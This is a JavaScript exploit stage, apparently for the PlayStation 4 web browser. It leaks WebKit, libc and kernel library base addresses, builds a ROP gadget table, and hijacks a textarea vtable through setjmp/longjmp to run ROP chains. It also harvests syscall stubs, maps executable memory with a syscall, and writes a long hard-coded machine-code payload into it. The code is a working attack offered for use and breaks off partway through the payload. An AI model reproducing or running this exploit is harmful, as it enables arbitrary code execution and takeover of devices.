var p;
var chain;
var nogc = [];
var webKitBase;
var libSceLibcInternalBase;
var libKernelBase;

const OFFSET_WK_vtable_first_element    = 0x009A6040;
const OFFSET_WK_memset_import           = 0x00002458;
const OFFSET_WK___stack_chk_fail_import = 0x00002438;
const OFFSET_WK_setjmp_gadget_one       = 0x006D81F5;
const OFFSET_WK_setjmp_gadget_two       = 0x00288F83;
const OFFSET_WK_longjmp_gadget_one      = 0x006D81F5;
const OFFSET_WK_longjmp_gadget_two      = 0x00288F83;



const OFFSET_libcint_memset             = 0x000507D0;
const OFFSET_libcint_setjmp             = 0x000BE39C;
const OFFSET_libcint_longjmp            = 0x000BE3F6;

const OFFSET_lk___stack_chk_fail        = 0x00012AD0;
const OFFSET_lk_pthread_create_name_np  = 0x0001BB10;
const OFFSET_lk_pthread_exit            = 0x00019FD0;
const OFFSET_lk_pthread_self            = 0x0001D160;
const OFFSET_lk_pthread_setschedparam   = 0x0002AD70;

var syscalls = {};
var gadgets = {};
var gadgetmap = {
  "ret": 0x0000003C,
  "pop rdi": 0x0000835D,
  "pop rsi": 0x0003C987,
  "pop rdx": 0x00052B23,
  "pop rcx": 0x00026AFB,
  "pop r8": 0x00097D32,
  "pop r9": 0x005C6A81,
  "pop rax": 0x0001FA68,
  "pop rsp": 0x00078C62,

  "mov [rdi], rax": 0x000203E9,
  "mov [rdi], eax": 0x00020148,
  "mov [rdi], rsi": 0x000359F0,
  "cmp [rcx], edi": 0x0010DA31,

  "setne al": 0x00009000,
  "sete al": 0x0001E0C4,
  "setle al": 0x000CA7F6,
  "setl al": 0x005955AC,
  "setge al": 0x0061B262,
  "setg al": 0x000E4A37,
  "shl rax, 3": 0x005E8953,
  "add rax, rdx": 0x003D498C,
  "mov rax, [rax]": 0x0002E852,
  "inc dword [rax]": 0x003628DB,
  "infpoop": 0x0001386A
};

var textArea = document.createElement("textarea");

function stage2() {
  p = window.prim;
  p.launch_chain = launch_chain;
  p.malloc = malloc;
  p.malloc32 = malloc32;
  p.stringify = stringify;
  p.readString = readString;
  p.array_from_address = array_from_address;

  //pointer to vtable address
  var textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
  //address of vtable
  var textAreaVtable = p.read8(textAreaVtPtr);
  //use address of 1st entry (in .text) to calculate webkitbase
  webKitBase = p.read8(textAreaVtable).sub32(OFFSET_WK_vtable_first_element);

  libSceLibcInternalBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_memset_import)));
  libSceLibcInternalBase.sub32inplace(OFFSET_libcint_memset);

  libKernelBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK___stack_chk_fail_import)));
  libKernelBase.sub32inplace(OFFSET_lk___stack_chk_fail);

  for (var gadget in gadgetmap) {
    window.gadgets[gadget] = webKitBase.add32(gadgetmap[gadget]);
  }

  function get_jmptgt(address) {
    var instr = p.read4(address) & 0xFFFF;
    var offset = p.read4(address.add32(2));
    if (instr != 0x25FF) {
      return 0;
    }
    return address.add32(0x6 + offset);
  }

  function malloc(sz) {
    var backing = new Uint8Array(0x10000 + sz);
    window.nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = backing;
    return ptr;
  }

  function malloc32(sz) {
    var backing = new Uint8Array(0x10000 + sz * 4);
    window.nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = new Uint32Array(backing.buffer);
    return ptr;
  }

  function array_from_address(addr, size) {
    var og_array = new Uint32Array(0x1000);
    var og_array_i = p.leakval(og_array).add32(0x10);

    p.write8(og_array_i, addr);
    p.write4(og_array_i.add32(8), size);

    nogc.push(og_array);
    return og_array;
  }

  function stringify(str) {
    var bufView = new Uint8Array(str.length + 1);
    for (var i = 0; i < str.length; i++) {
      bufView[i] = str.charCodeAt(i) & 0xFF;
    }
    window.nogc.push(bufView);
    return p.read8(p.leakval(bufView).add32(0x10));
  }
  function readString(addr)
  {
    var byte = p.read4(addr);
    var str  = "";
    var i = 0;
    while (byte & 0xFF)
    {
      str += String.fromCharCode(byte & 0xFF);
      byte = p.read4(addr.add32(i));
      i++;
    }
    return str;
  }



  var fakeVtable_setjmp = p.malloc32(0x200);
  var fakeVtable_longjmp = p.malloc32(0x200);
  var original_context = p.malloc32(0x40);
  var modified_context = p.malloc32(0x40);

  p.write8(fakeVtable_setjmp.add32(0x0), fakeVtable_setjmp);
  p.write8(fakeVtable_setjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_setjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
  p.write8(fakeVtable_setjmp.add32(0x10), original_context);
  p.write8(fakeVtable_setjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_setjmp));
  p.write8(fakeVtable_setjmp.add32(0x1D8), webKitBase.add32(OFFSET_WK_setjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]

  p.write8(fakeVtable_longjmp.add32(0x0), fakeVtable_longjmp);
  p.write8(fakeVtable_longjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_longjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
  p.write8(fakeVtable_longjmp.add32(0x10), modified_context);
  p.write8(fakeVtable_longjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
  p.write8(fakeVtable_longjmp.add32(0x1D8), webKitBase.add32(OFFSET_WK_longjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]

  function launch_chain(chain) {

    chain.push(window.gadgets["pop rdi"]);
    chain.push(original_context);
    chain.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));

    p.write8(textAreaVtPtr, fakeVtable_setjmp);
    textArea.scrollLeft = 0x0;
    p.write8(modified_context.add32(0x00), window.gadgets["ret"]);
    p.write8(modified_context.add32(0x10), chain.stack);
    p.write8(modified_context.add32(0x40), p.read8(original_context.add32(0x40)))

    p.write8(textAreaVtPtr, fakeVtable_longjmp);
    textArea.scrollLeft = 0x0;
    p.write8(textAreaVtPtr, textAreaVtable);
  }

  var kview = new Uint8Array(0x1000);
  var kstr = p.leakval(kview).add32(0x10);
  var orig_kview_buf = p.read8(kstr);

  p.write8(kstr, window.libKernelBase);
  p.write4(kstr.add32(8), 0x40000);
  var countbytes;

  for (var i = 0; i < 0x40000; i++) {
    if (kview[i] == 0x72 && kview[i + 1] == 0x64 && kview[i + 2] == 0x6c && kview[i + 3] == 0x6f && kview[i + 4] == 0x63) {
      countbytes = i;
      break;
    }
  }
  p.write4(kstr.add32(8), countbytes + 32);
  var dview32 = new Uint32Array(1);
  var dview8 = new Uint8Array(dview32.buffer);
  for (var i = 0; i < countbytes; i++) {
    if (kview[i] == 0x48 && kview[i + 1] == 0xc7 && kview[i + 2] == 0xc0 && kview[i + 7] == 0x49 && kview[i + 8] == 0x89 && kview[i + 9] == 0xca && kview[i + 10] == 0x0f && kview[i + 11] == 0x05) {
      dview8[0] = kview[i + 3];
      dview8[1] = kview[i + 4];
      dview8[2] = kview[i + 5];
      dview8[3] = kview[i + 6];
      var syscallno = dview32[0];
      window.syscalls[syscallno] = window.libKernelBase.add32(i);
    }
  }
  p.write8(kstr, orig_kview_buf);
  chain = new rop();
  if (chain.syscall(23, 0).low != 0x0) {
    try {
      stage3();
    } catch (e) {
      alert(e);
    }
  } 
    
  var payload_buffer = chain.syscall(477, new int64(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
  var payload_writer = p.array_from_address(payload_buffer, 0xC0000);

  payload_writer[0] = 0x0003dee9;
  payload_writer[1] = 0x41564100;
  payload_writer[2] = 0x55544155;
  payload_writer[3] = 0xf4894953;
  payload_writer[4] = 0x10ec8348;
  payload_writer[5] = 0x08478b48;
  payload_writer[6] = 0x000082b9;
  payload_writer[7] = 0x708b48c0;
  payload_writer[8] = 0x788b4840;
  payload_writer[9] = 0x48320f48;
  payload_writer[10] = 0xc148d189;
  payload_writer[11] = 0x46c720e1;
  payload_writer[12] = 0x00000014;
  payload_writer[13] = 0xc1094800;
  payload_writer[14] = 0x18868b48;
  payload_writer[15] = 0x4c000001;
  payload_writer[16] = 0xfe40a98d;
  payload_writer[17] = 0x894cffff;
  payload_writer[18] = 0x8948242c;
  payload_writer[19] = 0x46c748cb;
  payload_writer[20] = 0x00000004;
  payload_writer[21] = 0xb18d4c00;
  payload_writer[22] = 0x000bc570;
  payload_writer[23] = 0x000000c7;
  payload_writer[24] = 0x8b490000;
  payload_writer[25] = 0x13e39885;
  payload_writer[26] = 0xa98d4801;
  payload_writer[27] = 0x004f5190;
  payload_writer[28] = 0x30468948;
  payload_writer[29] = 0x50858b49;
  payload_writer[30] = 0x48022c57;
  payload_writer[31] = 0x48204789;
  payload_writer[32] = 0x48184789;
  payload_writer[33] = 0xf500818d;
  payload_writer[34] = 0x03bf004e;
  payload_writer[35] = 0xff000000;
  payload_writer[36] = 0x838d48d0;
  payload_writer[37] = 0x003f1d20;
  payload_writer[38] = 0x000008bf;
  payload_writer[39] = 0x31d0ff00;
  payload_writer[40] = 0x0320beff;
  payload_writer[41] = 0xd5ff0000;
  payload_writer[42] = 0x0002a2be;
  payload_writer[43] = 0x0001bf00;
  payload_writer[44] = 0xd5ff0000;
  payload_writer[45] = 0x000262be;
  payload_writer[46] = 0x0002bf00;
  payload_writer[47] = 0xd5ff0000;
  payload_writer[48] = 0x000320be;
  payload_writer[49] = 0x0003bf00;
  payload_writer[50] = 0xd5ff0000;
  payload_writer[51] = 0x000320be;
  payload_writer[52] = 0x0004bf00;
  payload_writer[53] = 0xd5ff0000;
  payload_writer[54] = 0x0002d0be;
  payload_writer[55] = 0x0005bf00;
  payload_writer[56] = 0xd5ff0000;
  payload_writer[57] = 0x0002d0be;
  payload_writer[58] = 0x0006bf00;
  payload_writer[59] = 0xd5ff0000;
  payload_writer[60] = 0x50838d48;
  payload_writer[61] = 0xbf004f57;
  payload_writer[62] = 0x00000012;
  payload_writer[63] = 0x8d48d0ff;
  payload_writer[64] = 0x4f5b6083;
  payload_writer[65] = 0x0012bf00;
  payload_writer[66] = 0xd0ff0000;
  payload_writer[67] = 0x48c0200f;
  payload_writer[68] = 0xfeffff25;
  payload_writer[69] = 0xc0220fff;
  payload_writer[70] = 0x24048b48;
  payload_writer[71] = 0x6e85c641;
  payload_writer[72] = 0x03002cdd;
  payload_writer[73] = 0x455a158b;
  payload_writer[74] = 0x8d480000;
  payload_writer[75] = 0x001cbb35;
  payload_writer[76] = 0xc3814800;
  payload_writer[77] = 0x0002ef80;
  payload_writer[78] = 0x20a88d48;
  payload_writer[79] = 0x4800b1d8;
  payload_writer[80] = 0x15ffef89;
  payload_writer[81] = 0x00005290;
  payload_writer[82] = 0x24048b48;
  payload_writer[83] = 0x8d48f631;
  payload_writer[84] = 0x0bc730b8;
  payload_writer[85] = 0x48d5ff00;
  payload_writer[86] = 0x452a3d8d;
  payload_writer[87] = 0xc0310000;
  payload_writer[88] = 0x48d6ff41;
  payload_writer[89] = 0x4824348b;
  payload_writer[90] = 0x45463d8d;
  payload_writer[91] = 0xc0310000;
  payload_writer[92] = 0x49d6ff41;
  payload_writer[93] = 0x1024748d;
  payload_writer[94] = 0x247c8d48;
  payload_writer[95] = 0x0008ba08;
  payload_writer[96] = 0x15ff0000;
  payload_writer[97] = 0x00005250;
  payload_writer[98] = 0x24748b48;
  payload_writer[99] = 0x3d8d4808;
  payload_writer[100] = 0x0000453a;
  payload_writer[101] = 0xff41c031;
  payload_writer[102] = 0x748b48d6;
  payload_writer[103] = 0x89480824;
  payload_writer[104] = 0x0008bae7;
  payload_writer[105] = 0xd3ff0000;
  payload_writer[106] = 0x10c48348;
  payload_writer[107] = 0x5d5bc031;
  payload_writer[108] = 0x5d415c41;
  payload_writer[109] = 0x31c35e41;
  payload_writer[110] = 0x8948c3c0;
  payload_writer[111] = 0x48320ff9;
  payload_writer[112] = 0xc148d789;
  payload_writer[113] = 0x094820e7;
  payload_writer[114] = 0x4853c3f8;
  payload_writer[115] = 0x8148fa89;
  payload_writer[116] = 0x000200ec;
  payload_writer[117] = 0x358d4800;
  payload_writer[118] = 0x00004506;
  payload_writer[119] = 0x31e38948;
  payload_writer[120] = 0xdf8948c0;
  payload_writer[121] = 0x534615ff;
  payload_writer[122] = 0x89480000;
  payload_writer[123] = 0x0081bfde;
  payload_writer[124] = 0x15ff0000;
  payload_writer[125] = 0x00005060;
  payload_writer[126] = 0x00c48148;
  payload_writer[127] = 0x5b000002;
  payload_writer[128] = 0x415741c3;
  payload_writer[129] = 0x41554156;
  payload_writer[130] = 0x48535554;
  payload_writer[131] = 0x4818ec83;
  payload_writer[132] = 0x4cde358d;
  payload_writer[133] = 0x8d480000;
  payload_writer[134] = 0x0044cf3d;
  payload_writer[135] = 0xad15ff00;
  payload_writer[136] = 0x48000052;
  payload_writer[137] = 0x1a75c085;
  payload_writer[138] = 0x18c48348;
  payload_writer[139] = 0xcb3d8d48;
  payload_writer[140] = 0x5b000044;
  payload_writer[141] = 0x415c415d;
  payload_writer[142] = 0x415e415d;
  payload_writer[143] = 0xff88e95f;
  payload_writer[144] = 0x8948ffff;
  payload_writer[145] = 0xbaf631c3;
  payload_writer[146] = 0x00000002;
  payload_writer[147] = 0xffc78948;
  payload_writer[148] = 0x0051f315;
  payload_writer[149] = 0xdf894800;
  payload_writer[150] = 0x529215ff;
  payload_writer[151] = 0xd2310000;
  payload_writer[152] = 0x8948f631;
  payload_writer[153] = 0xc68949df;
  payload_writer[154] = 0x51da15ff;
  payload_writer[155] = 0x8d480000;
  payload_writer[156] = 0x004c7f35;
  payload_writer[157] = 0x3d8d4800;
  payload_writer[158] = 0x000044ad;
  payload_writer[159] = 0x524e15ff;
  payload_writer[160] = 0x85480000;
  payload_writer[161] = 0xc58948c0;
  payload_writer[162] = 0x8d481175;
  payload_writer[163] = 0x00448c3d;
  payload_writer[164] = 0xff34e800;
  payload_writer[165] = 0x8948ffff;
  payload_writer[166] = 0x313febdf;
  payload_writer[167] = 0x0002baf6;
  payload_writer[168] = 0x89480000;
  payload_writer[169] = 0x9d15ffc7;
  payload_writer[170] = 0x48000051;
  payload_writer[171] = 0x15ffef89;
  payload_writer[172] = 0x0000523c;
  payload_writer[173] = 0xf631d231;
  payload_writer[174] = 0x48c78949;
  payload_writer[175] = 0x15ffef89;
  payload_writer[176] = 0x00005184;
  payload_writer[177] = 0x74f68545;
  payload_writer[178] = 0xff854505;
  payload_writer[179] = 0x89482075;
  payload_writer[180] = 0x2915ffdf;
  payload_writer[181] = 0x48000052;
  payload_writer[182] = 0x8348ef89;
  payload_writer[183] = 0x5d5b18c4;
  payload_writer[184] = 0x5d415c41;
  payload_writer[185] = 0x5f415e41;
  payload_writer[186] = 0x521225ff;
  payload_writer[187] = 0x63490000;
  payload_writer[188] = 0xf78948f6;
  payload_writer[189] = 0x24748948;
  payload_writer[190] = 0xf115ff08;
  payload_writer[191] = 0x4d000050;
  payload_writer[192] = 0x8949c763;
  payload_writer[193] = 0xc7894cc5;
  payload_writer[194] = 0x2404894c;
  payload_writer[195] = 0x50de15ff;
  payload_writer[196] = 0x8b480000;
  payload_writer[197] = 0x48082474;
  payload_writer[198] = 0x8949d989;
  payload_writer[199] = 0xef894cc4;
  payload_writer[200] = 0x000001ba;
  payload_writer[201] = 0x8515ff00;
  payload_writer[202] = 0x4c000051;
  payload_writer[203] = 0x4824048b;
  payload_writer[204] = 0x01bae989;
  payload_writer[205] = 0x4c000000;
  payload_writer[206] = 0x894ce789;
  payload_writer[207] = 0x6d15ffc6;
  payload_writer[208] = 0x48000051;
  payload_writer[209] = 0x15ffdf89;
  payload_writer[210] = 0x000051b4;
  payload_writer[211] = 0xffef8948;
  payload_writer[212] = 0x0051ab15;
  payload_writer[213] = 0xf8894500;
  payload_writer[214] = 0xe60d8d4c;
  payload_writer[215] = 0x4c000043;
  payload_writer[216] = 0x8944e189;
  payload_writer[217] = 0xee894cf2;
  payload_writer[218] = 0x000099bf;
  payload_writer[219] = 0xe8c03100;
  payload_writer[220] = 0x0000134d;
  payload_writer[221] = 0xffef894c;
  payload_writer[222] = 0x00520b15;
  payload_writer[223] = 0xe7894c00;
  payload_writer[224] = 0x520215ff;
  payload_writer[225] = 0x8d480000;
  payload_writer[226] = 0x0043f635;
  payload_writer[227] = 0x021cbf00;
  payload_writer[228] = 0xc0310000;
  payload_writer[229] = 0x001328e8;
  payload_writer[230] = 0x4000ba00;
  payload_writer[231] = 0xc9310000;
  payload_writer[232] = 0x89c38948;
  payload_writer[233] = 0x0222bfc6;
  payload_writer[234] = 0xc0310000;
  payload_writer[235] = 0x001310e8;
  payload_writer[236] = 0xbfde8900;
  payload_writer[237] = 0x0000021d;
  payload_writer[238] = 0x02e8c031;
  payload_writer[239] = 0x48000013;
  payload_writer[240] = 0xba18c483;
  payload_writer[241] = 0x0000001e;
  payload_writer[242] = 0x0001be5b;
  payload_writer[243] = 0xbf5d0000;
  payload_writer[244] = 0x00000025;
  payload_writer[245] = 0xc0315c41;
  payload_writer[246] = 0x5e415d41;
  payload_writer[247] = 0xdee95f41;
  payload_writer[248] = 0x53000012;
  payload_writer[249] = 0xe8fb8948;
  payload_writer[250] = 0x00000081;
  payload_writer[251] = 0x000ddce8;
  payload_writer[252] = 0x08cde800;
  payload_writer[253] = 0x88e80000;
  payload_writer[254] = 0xe800000c;
  payload_writer[255] = 0x00000429;
  payload_writer[256] = 0x41c93145;
  payload_writer[257] = 0xb9ffc883;
  payload_writer[258] = 0x00001002;
  payload_writer[259] = 0x000003ba;
  payload_writer[260] = 0x1000be00;
  payload_writer[261] = 0xff310000;
  payload_writer[262] = 0x000846e8;
  payload_writer[263] = 0xda894800;
  payload_writer[264] = 0xde358d48;
  payload_writer[265] = 0x48fffffb;
  payload_writer[266] = 0x0bbfc189;
  payload_writer[267] = 0x31000000;
  payload_writer[268] = 0x128be8c0;
  payload_writer[269] = 0xc0310000;
  payload_writer[270] = 0xfffdc4e8;
  payload_writer[271] = 0xffff31ff;
  payload_writer[272] = 0x004eb315;
  payload_writer[273] = 0x5bc03100;
  payload_writer[274] = 0xc0c748c3;
  payload_writer[275] = 0x00000025;
  payload_writer[276] = 0x00126fe9;
  payload_writer[277] = 0xc0c74800;
  payload_writer[278] = 0x00000036;
  payload_writer[279] = 0x001263e9;
  payload_writer[280] = 0xc0c74800;
  payload_writer[281] = 0x0000000b;
  payload_writer[282] = 0x001257e9;
  payload_writer[283] = 0xec834800;
  payload_writer[284] = 0x358d4808;
  payload_writer[285] = 0x00004cc8;
  payload_writer[286] = 0xc43d8d48;
  payload_writer[287] = 0x48000046;
  payload_writer[288] = 0x4d3605c7;
  payload_writer[289] = 0x00000000;
  payload_writer[290] = 0x6ce80000;
  payload_writer[291] = 0x85000007;
  payload_writer[292] = 0x482a74c0;
  payload_writer[293] = 0x4ca6358d;
  payload_writer[294] = 0x8d480000;
  payload_writer[295] = 0x0042f33d;
  payload_writer[296] = 0x0755e800;
  payload_writer[297] = 0xc0850000;
  payload_writer[298] = 0x8d481374;
  payload_writer[299] = 0x004c8f35;
  payload_writer[300] = 0x3d8d4800;
  payload_writer[301] = 0x000042ef;
  payload_writer[302] = 0x00073ee8;
  payload_writer[303] = 0x7d3d8b00;
  payload_writer[304] = 0x4800004c;
  payload_writer[305] = 0x4c7e158d;
  payload_writer[306] = 0x8d480000;
  payload_writer[307] = 0x0042e935;
  payload_writer[308] = 0x06efe800;
  payload_writer[309] = 0x3d8b0000;
  payload_writer[310] = 0x00004c64;
  payload_writer[311] = 0xa5158d48;
  payload_writer[312] = 0x4800004c;
  payload_writer[313] = 0x42e2358d;
  payload_writer[314] = 0xd6e80000;
  payload_writer[315] = 0x8b000006;
  payload_writer[316] = 0x004c4b3d;
  payload_writer[317] = 0x158d4800;
  payload_writer[318] = 0x00004cc4;
  payload_writer[319] = 0xda358d48;
  payload_writer[320] = 0xe8000042;
  payload_writer[321] = 0x000006bd;
  payload_writer[322] = 0x4c323d8b;
  payload_writer[323] = 0x8d480000;
  payload_writer[324] = 0x004c8b15;
  payload_writer[325] = 0x358d4800;
  payload_writer[326] = 0x000042c9;
  payload_writer[327] = 0x0006a4e8;
  payload_writer[328] = 0x193d8b00;
  payload_writer[329] = 0x4800004c;
  payload_writer[330] = 0x4cb2158d;
  payload_writer[331] = 0x8d480000;
  payload_writer[332] = 0x0042bf35;
  payload_writer[333] = 0x068be800;
  payload_writer[334] = 0x3d8b0000;
  payload_writer[335] = 0x00004c00;
  payload_writer[336] = 0xc1158d48;
  payload_writer[337] = 0x4800004c;
  payload_writer[338] = 0x42bf358d;
  payload_writer[339] = 0x72e80000;
  payload_writer[340] = 0x8b000006;
  payload_writer[341] = 0x004be73d;
  payload_writer[342] = 0x158d4800;
  payload_writer[343] = 0x00004c30;
  payload_writer[344] = 0xc4358d48;
  payload_writer[345] = 0xe8000042;
  payload_writer[346] = 0x00000659;
  payload_writer[347] = 0x4bce3d8b;
  payload_writer[348] = 0x8d480000;
  payload_writer[349] = 0x004bd715;
  payload_writer[350] = 0x358d4800;
  payload_writer[351] = 0x000042c4;
  payload_writer[352] = 0x000640e8;
  payload_writer[353] = 0xb53d8b00;
  payload_writer[354] = 0x4800004b;
  payload_writer[355] = 0x4c46158d;
  payload_writer[356] = 0x8d480000;
  payload_writer[357] = 0x0042c835;
  payload_writer[358] = 0x0627e800;
  payload_writer[359] = 0x3d8b0000;
  payload_writer[360] = 0x00004b9c;
  payload_writer[361] = 0x85158d48;
  payload_writer[362] = 0x4800004c;
  payload_writer[363] = 0x42bd358d;
  payload_writer[364] = 0x0ee80000;
  payload_writer[365] = 0x8b000006;
  payload_writer[366] = 0x004b833d;
  payload_writer[367] = 0x158d4800;
  payload_writer[368] = 0x00004bec;
  payload_writer[369] = 0xb2358d48;
  payload_writer[370] = 0xe8000042;
  payload_writer[371] = 0x000005f5;
  payload_writer[372] = 0x4b6a3d8b;
  payload_writer[373] = 0x8d480000;
  payload_writer[374] = 0x004bf315;
  payload_writer[375] = 0x358d4800;
  payload_writer[376] = 0x000042a7;
  payload_writer[377] = 0x0005dce8;
  payload_writer[378] = 0x513d8b00;
  payload_writer[379] = 0x4800004b;
  payload_writer[380] = 0x4bf2158d;
  payload_writer[381] = 0x8d480000;
  payload_writer[382] = 0x00429d35;
  payload_writer[383] = 0x05c3e800;
  payload_writer[384] = 0x3d8b0000;
  payload_writer[385] = 0x00004b38;
  payload_writer[386] = 0x59158d48;
  payload_writer[387] = 0x4800004b;
  payload_writer[388] = 0x4293358d;
  payload_writer[389] = 0xaae80000;
  payload_writer[390] = 0x8b000005;
  payload_writer[391] = 0x004b1f3d;
  payload_writer[392] = 0x158d4800;
  payload_writer[393] = 0x00004be8;
  payload_writer[394] = 0x89358d48;
  payload_writer[395] = 0xe8000042;
  payload_writer[396] = 0x00000591;
  payload_writer[397] = 0x4b063d8b;
  payload_writer[398] = 0x8d480000;
  payload_writer[399] = 0x004aef15;
  payload_writer[400] = 0x358d4800;
  payload_writer[401] = 0x00004280;
  payload_writer[402] = 0x000578e8;
  payload_writer[403] = 0xed3d8b00;
  payload_writer[404] = 0x4800004a;
  payload_writer[405] = 0x4b9e158d;
  payload_writer[406] = 0x8d480000;
  payload_writer[407] = 0x00427d35;
  payload_writer[408] = 0x055fe800;
  payload_writer[409] = 0x3d8b0000;
  payload_writer[410] = 0x00004ad4;
  payload_writer[411] = 0xfd158d48;
  payload_writer[412] = 0x4800004a;
  payload_writer[413] = 0x427c358d;
  payload_writer[414] = 0x46e80000;
  payload_writer[415] = 0x8b000005;
  payload_writer[416] = 0x004abb3d;
  payload_writer[417] = 0x158d4800;
  payload_writer[418] = 0x00004b1c;
  payload_writer[419] = 0x7a358d48;
  payload_writer[420] = 0xe8000042;
  payload_writer[421] = 0x0000052d;
  payload_writer[422] = 0x4aa23d8b;
  payload_writer[423] = 0x8d480000;
  payload_writer[424] = 0x004ba315;
  payload_writer[425] = 0x358d4800;
  payload_writer[426] = 0x00004268;
  payload_writer[427] = 0x000514e8;
  payload_writer[428] = 0x893d8b00;
  payload_writer[429] = 0x4800004a;
  payload_writer[430] = 0x4ada158d;
  payload_writer[431] = 0x8d480000;
  payload_writer[432] = 0x00425c35;
  payload_writer[433] = 0x04fbe800;
  payload_writer[434] = 0x3d8b0000;
  payload_writer[435] = 0x00004a70;
  payload_writer[436] = 0x81158d48;
  payload_writer[437] = 0x4800004a;
  payload_writer[438] = 0x424b358d;
  payload_writer[439] = 0xe2e80000;
  payload_writer[440] = 0x8b000004;
  payload_writer[441] = 0x004a573d;
  payload_writer[442] = 0x158d4800;
  payload_writer[443] = 0x00004b30;
  payload_writer[444] = 0x39358d48;
  payload_writer[445] = 0xe8000042;
  payload_writer[446] = 0x000004c9;
  payload_writer[447] = 0x4a3e3d8b;
  payload_writer[448] = 0x8d480000;
  payload_writer[449] = 0x004ae715;
  payload_writer[450] = 0x358d4800;
  payload_writer[451] = 0x0000422d;
  payload_writer[452] = 0x0004b0e8;
  payload_writer[453] = 0x253d8b00;
  payload_writer[454] = 0x4800004a;
  payload_writer[455] = 0x4b06158d;
  payload_writer[456] = 0x8d480000;
  payload_writer[457] = 0x00422b35;
  payload_writer[458] = 0x0497e800;
  payload_writer[459] = 0x3d8b0000;
  payload_writer[460] = 0x00004a0c;
  payload_writer[461] = 0x3d158d48;
  payload_writer[462] = 0x4800004a;
  payload_writer[463] = 0x4228358d;
  payload_writer[464] = 0x7ee80000;
  payload_writer[465] = 0x8b000004;
  payload_writer[466] = 0x0049f33d;
  payload_writer[467] = 0x158d4800;
  payload_writer[468] = 0x00004ac4;
  payload_writer[469] = 0x25358d48;
  payload_writer[470] = 0xe8000042;
  payload_writer[471] = 0x00000465;
  payload_writer[472] = 0x49da3d8b;
  payload_writer[473] = 0x8d480000;
  payload_writer[474] = 0x004ad315;
  payload_writer[475] = 0x358d4800;
  payload_writer[476] = 0x00004222;
  payload_writer[477] = 0x00044ce8;
  payload_writer[478] = 0xc13d8b00;
  payload_writer[479] = 0x48000049;
  payload_writer[480] = 0x49fa158d;
  payload_writer[481] = 0x8d480000;
  payload_writer[482] = 0x00421f35;
  payload_writer[483] = 0x0433e800;
  payload_writer[484] = 0x3d8b0000;
  payload_writer[485] = 0x000049a8;
  payload_writer[486] = 0x99158d48;
  payload_writer[487] = 0x48000049;
  payload_writer[488] = 0x420d358d;
  payload_writer[489] = 0x1ae80000;
  payload_writer[490] = 0x8b000004;
  payload_writer[491] = 0x00498f3d;
  payload_writer[492] = 0x158d4800;
  payload_writer[493] = 0x000049a8;
  payload_writer[494] = 0xfb358d48;
  payload_writer[495] = 0xe8000041;
  payload_writer[496] = 0x00000401;
  payload_writer[497] = 0x49763d8b;
  payload_writer[498] = 0x8d480000;
  payload_writer[499] = 0x004a6715;
  payload_writer[500] = 0x358d4800;
  payload_writer[501] = 0x000041e9;
  payload_writer[502] = 0x0003e8e8;
  payload_writer[503] = 0x5d3d8b00;
  payload_writer[504] = 0x48000049;
  payload_writer[505] = 0x49de158d;
  payload_writer[506] = 0x8d480000;
  payload_writer[507] = 0x0041d735;
  payload_writer[508] = 0x03cfe800;
  payload_writer[509] = 0x3d8b0000;
  payload_writer[510] = 0x00004944;
  payload_writer[511] = 0xfd158d48;
  payload_writer[512] = 0x48000049;
  payload_writer[513] = 0x41c5358d;
  payload_writer[514] = 0xb6e80000;
  payload_writer[515] = 0x8b000003;
  payload_writer[516] = 0x00492b3d;
  payload_writer[517] = 0x158d4800;
  payload_writer[518] = 0x0000499c;
  payload_writer[519] = 0x358d4858;
  payload_writer[520] = 0x000041b4;
  payload_writer[521] = 0x00039ce9;
  payload_writer[522] = 0x48535500;
  payload_writer[523] = 0x4508ec83;
  payload_writer[524] = 0x3145c931;
  payload_writer[525] = 0x31c931c0;
  payload_writer[526] = 0x48f631d2;
  payload_writer[527] = 0x419f3d8d;
  payload_writer[528] = 0x15ff0000;
  payload_writer[529] = 0x00004998;
  payload_writer[530] = 0x45c93145;
  payload_writer[531] = 0xc589c031;
  payload_writer[532] = 0xd231c931;
  payload_writer[533] = 0x8d48f631;
  payload_writer[534] = 0x0041aa3d;
  payload_writer[535] = 0x7d15ff00;
  payload_writer[536] = 0x89000049;
  payload_writer[537] = 0x158d48ef;
  payload_writer[538] = 0x000049ec;
  payload_writer[539] = 0x8d48c389;
  payload_writer[540] = 0x0041be35;
  payload_writer[541] = 0x034be800;
  payload_writer[542] = 0x89580000;
  payload_writer[543] = 0x8d485bdf;
  payload_writer[544] = 0x0049e315;
  payload_writer[545] = 0x8d485d00;
  payload_writer[546] = 0x0041cf35;
  payload_writer[547] = 0x0333e900;
  payload_writer[548] = 0x48530000;
  payload_writer[549] = 0x8148fa89;
  payload_writer[550] = 0x000200ec;
  payload_writer[551] = 0x358d4800;
  payload_writer[552] = 0x00004702;
  payload_writer[553] = 0x31e38948;
  payload_writer[554] = 0xdf8948c0;
  payload_writer[555] = 0x4c7e15ff;
  payload_writer[556] = 0x89480000;
  payload_writer[557] = 0x00debfde;
  payload_writer[558] = 0x15ff0000;
  payload_writer[559] = 0x00004998;
  payload_writer[560] = 0x00c48148;
  payload_writer[561] = 0x5b000002;
  payload_writer[562] = 0xfff631c3;
  payload_writer[563] = 0x00499725;
  payload_writer[564] = 0x31455300;
  payload_writer[565] = 0xec8348c9;
  payload_writer[566] = 0xc0314510;
  payload_writer[567] = 0xd231c931;
  payload_writer[568] = 0x8d48f631;
  payload_writer[569] = 0x0041943d;
  payload_writer[570] = 0xf115ff00;
  payload_writer[571] = 0x48000048;
  payload_writer[572] = 0x495a158d;
